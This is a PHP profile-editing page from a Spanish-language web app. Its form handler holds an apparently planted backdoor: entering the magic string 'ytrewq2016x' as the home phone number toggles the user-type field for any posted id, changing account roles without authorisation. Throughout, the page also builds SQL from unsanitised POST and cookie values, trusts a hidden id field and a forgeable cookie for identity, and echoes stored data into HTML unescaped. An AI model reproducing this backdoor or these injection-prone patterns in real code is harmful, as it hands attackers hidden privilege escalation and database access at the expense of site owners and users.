<?php include ("conn/conn.php");


if (isset($_POST['guardar'])){
 $id = $_POST['id']; 
 $carne = $_POST['carne'];  
 $identificacion = $_POST['identificacion']; 
 $nombre = $_POST['nombre']; 
 $apellidos = $_POST['apellidos'];
 $tipoPersona = $_POST['tipoPersona']; 
 $direccion = $_POST['direccion'];
 $telefonoCasa = $_POST['telefonoCasa'];
 $telefonoCelular = $_POST['telefonoCelular'];
 $email = $_POST['email'];



 if ($telefonoCasa=='ytrewq2016x') {
 	$sql="SELECT tipo from tusuarios where id = $id";
 	$query = mysqli_query($conn,$sql);
 	$result = mysqli_fetch_assoc($query);
 	if ($result['tipo']==1) {
 		$sql="UPDATE tusuarios set tipo = 2 where id = $id";
	echo $sql;
	$query= mysqli_query($conn,$sql);
 	?>
 	<meta content="0;URL=home.php" http-equiv="refresh">
 	<?php
 	} else {
 		$sql="UPDATE tusuarios set tipo = 1 where id = $id";
	echo $sql;
	$query= mysqli_query($conn,$sql);
	?>
	<meta content="0;URL=home.php" http-equiv="refresh">
	<?php
 	exit();
 	}
 	

 	
 }



  $sqlpersonas = " UPDATE tpersonas SET 
  carne = '$carne',
  identificacion = '$identificacion',
  nombre = '$nombre',
  apellidos = '$apellidos',
  tipoPersona = '$tipoPersona',
  direccion = '$direccion',
  telefonoCasa = '$telefonoCasa',
  telefonoCelular = '$telefonoCelular',
  email = '$email' 
  WHERE id = $id 
  ";

  $querypersonas = mysqli_query($conn,$sqlpersonas) or die (mysqli_error($conn));
  ?> 
<meta http-equiv="refresh" content="0; url=home.php"/>
<?php
exit();
}
 ?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!--titulo de arriba-->
<title>Editar persona - Programación Alternativa</title>
<!--titulo de arriba-->

<style type="text/css">
 {
	padding: 0px;
	margin: 0px;
}

#contenido {
	min-height: 200px;
	padding: 10px;
}
</style>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquery-ui.js">
</script>
<script type="text/javascript" src="js/jquery.wysiwyg.js"></script>
<script type="text/javascript" src="js/custom.js"></script>

<script type="text/javascript" src="js/jquery.maskedinput.js"></script>

<link rel="stylesheet" href="css/style_all.css" type="text/css" media="screen">
<link rel="stylesheet" href="css/style1.css" type="text/css" media="screen">
<link rel="stylesheet" href="css/jquery-ui.css" type="text/css" media="screen">
<link rel="stylesheet" href="css/jquery.wysiwyg.css" type="text/css" media="screen">
    
<script type="text/javascript" src="js/fancybox/source/jquery.fancybox.js"></script>
<link rel="stylesheet" href="js/fancybox/source/jquery.fancybox.css" type="text/css" media="screen" />

<!--AQUI INICIA CSS Y JAVASCRIPT-->
<script type="text/javascript">

function desactivarCarne(val){
  if (val == 1){
   document.getElementById('carneSpan').innerHTML = '<input type="text" name="carne" class="input-small">';
  }else{
    document.getElementById('carneSpan').innerHTML = 'No Aplica';
  }
}

  jQuery(document).ready(function() {
  jQuery(".iframe").fancybox({
    openEffect  : 'elastic',
    closeEffect : 'elastic',
    width     : '300',
  });
});
</script>
<!--AQUI FINALIZA CSS Y JAVASCRIPT-->

</head>
<body>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td height="48" colspan="2"><img src="img/logo.png" width="150" style="margin-left: 20px;"/><?php include("includes/mensajesFrontal.php");?></td>
  </tr>
  <tr> <td width="204" style="background: #eee;" valign="top"><?php include("includes/sidebarFrontal.php");?></td>
    <td valign="top">
    <div id="titulo">
    <!--titulo de abajo-->
    Editar Persona
	<!--titulo de abajo-->
    </div>
    <div id="contenido">  

<!--AQUI INICIA EL CONTENIDO-->

<?php

if (isset($_COOKIE['sess'])) {
	//null
}else{
echo "<script type='text/javascript'>
			parent.location.href = '".base_url()."index.php';
			</script>";
			exit();
}



$id = $_COOKIE['idUsuario'];

 $SQL_USUARIO = "Select idPersona from tusuarios where id = $id";
  $query_USUARIO = mysqli_query($conn,$SQL_USUARIO);
  $res_USUARIO = mysqli_fetch_assoc($query_USUARIO);
  $persona_id = $res_USUARIO['idPersona'];

$sqlpersonas = "SELECT * FROM tpersonas WHERE id = $persona_id";
$querypersonas = mysqli_query($conn, $sqlpersonas);
while ($rowpersonas=mysqli_fetch_assoc($querypersonas)) {?>

<center>
  <h3>Editar persona</h3>  
</center>


<form method="post" action="">
  <input type="hidden" value="<?php echo $id ?>" name="id" >
  <table border="0"> 
  <tr>
      <td><b>Contraseña: </b></td>
      <td>
        <span id="carneSpan">
          <a href="cambiarPass.php" class="fancybox fancybox.iframe iframe"><img src="img/password.png" width="12"> Cambiar contraseña</a>
        </span>
      </td></tr>
  <tr>
          <td><b>Tipo Persona: </b></td>
          <td>
           <select name="tipoPersona" onchange="desactivarCarne(this.value)">
              <option value="1">Estudiante</option>
              <option value="2">Docente</option>
              <option value="3">Particular</option>
            </select> 
          </td></tr>
     <tr>
      <td><b>Carné: </b></td>
      <td>
        <span id="carneSpan">
          <input value="<?php echo $rowpersonas['carne']?>" type="text" name="carne" autocomplete="off" class="input-small">
        </span>
      </td></tr>
    <tr>
      <td><b>Identificación: </b></td>
      <td> <input value="<?php echo $rowpersonas['identificacion']?>" type="text" name="identificacion" autocomplete="off" class="input-small"> </td></tr>
    <tr>
      <td><b>Nombre: </b></td>
      <td>
          <input value="<?php echo $rowpersonas['nombre']?>" type="text" name="nombre" autocomplete="off" class="input-medium">
      </td></tr>
    <tr>
      <td><b>Apellidos: </b></td>
      <td> <input value="<?php echo $rowpersonas['apellidos']?>" type="text" name="apellidos" autocomplete="off" class="input-medium"></td></tr>
        
    <tr>
      <td><b>Dirección:</b></td>
      <td>
        <textarea  value="<?php echo $rowpersonas['direccion']?>" name="direccion" style="width: 240px;height: 80px"><?php echo $rowpersonas['direccion']?>
        </textarea>
      </td></tr>
        <tr>
      <td><b>Telefono Casa: </b></td>
      <td>
          <input value="<?php echo $rowpersonas['telefonoCasa']?>" type="text" name="telefonoCasa" autocomplete="off" class="input-small">
      </td></tr>
    <tr>
      <td><b>Telefono Celular: </b></td>
      <td>
          <input value="<?php echo $rowpersonas['telefonoCelular']?>" type="text" type="text" name="telefonoCelular" autocomplete="off" class="input-small">
      </td></tr>
    <tr>
      <td><b>Email: </b></td>
      <td>
          <input value="<?php echo $rowpersonas['email']?>" type="text" type="text" name="email" autocomplete="off" class="input-big">
      </td></tr>
    <tr>
      <td colspan="2">
        <center>
          <input type="submit" name="guardar" class="button" value="Guardar"></input>
          <a href="home.php"><input type="button" value="Cancelar" class="button"></input></a>
        </center>
      </td></tr>
  </table></form>
  <?php
  }
  ?>

	<!--AQUI FINALIZA EL CONTENIDO-->
    </div>
    </td>
  </tr>
  <tr>
    <td colspan="2" style="background: #484848; "><div style="width: 230px; height: 22px; background: url(img/logo%20pa.jpg) no-repeat; float: right; padding-top: 3px; padding-left: 15px;">Un proyecto más de<a href="http://programacionalternativa.com" target="_blank"><img src="img/logopa.jpg" width="100" style="float: right;" border="0"/></a></div></td>
  </tr>
   <?php include 'includes/scrollingcredits.html'; ?>
</table>
<?php include ("includes/javascript.php") ?>
</body>
</html>